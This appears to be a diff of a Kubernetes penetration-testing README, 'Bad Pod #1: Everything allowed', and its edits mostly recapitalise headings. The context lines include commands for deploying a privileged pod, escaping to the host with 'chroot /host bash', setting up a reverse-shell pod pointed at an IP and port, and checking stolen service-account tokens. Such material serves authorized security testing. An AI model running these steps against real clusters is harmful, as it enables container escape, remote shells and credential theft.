@@ -1,20 +1,21 @@
 # Bad Pod #1: Everything allowed
 
 ## Table of Contents
-* [Pod Creation & Access](#Pod-Creation-&-Access)
-   * [Exec Pods](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
-   * [Reverse Shell Pods](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
-   * [Deleting Resources](#Deleting-Resources)
+* [Pod creation & access](#Pod-Creation-&-Access)
+   * [Exec pods](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
+   * [Reverse shell pods](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
+   * [Deleting resources](#Deleting-Resources)
 * [Post exploitation](#Post-exploitation)
    * [Look for kubeconfig's in the host filesystem](#Look-for-kubeconfigs-in-the-host-filesystem) 
    * [Grab all tokens from all pods on the system](#Grab-all-tokens-from-all-pods-on-the-system)
    * [Some other ideas](#Some-other-ideas)
    * [Attacks that apply to all pods, even without any special permissions](#Attacks-that-apply-to-all-pods-even-without-any-special-permissions)
+* [Demonstrate impact](#Demonstrate-impact)
+* [References](#References)
 
+# Pod creation & access
 
-# Pod Creation & Access
-
-## Exec Pods: Create one or more of these resource types and exec into the pod
+## Exec pods: Create one or more of these resource types and exec into the pod
 **Pod**  
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
@@ -64,7 +65,7 @@ kubectl get pods | grep everything-allowed-exec-daemonset
 kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ```
 
-## Reverse Shell Pods: Create one or more of these resources and catch reverse shell
+## Reverse shell pods: Create one or more of these resources and catch reverse shell
 
 Set up listener
 ```bash
@@ -91,7 +92,7 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_
 ```
 
 
-## Deleting Resources
+## Deleting resources
 You can delete a resource using it's manifest, or by name: 
 ```
 kubectl delete [type] [resourcename]
@@ -186,7 +187,7 @@ kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 * Kubernetes exploits
 * Hunting for vulnerable application/services in the cluster
 
-# Demonstrate Impact
+# Demonstrate impact
 
 If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 
 
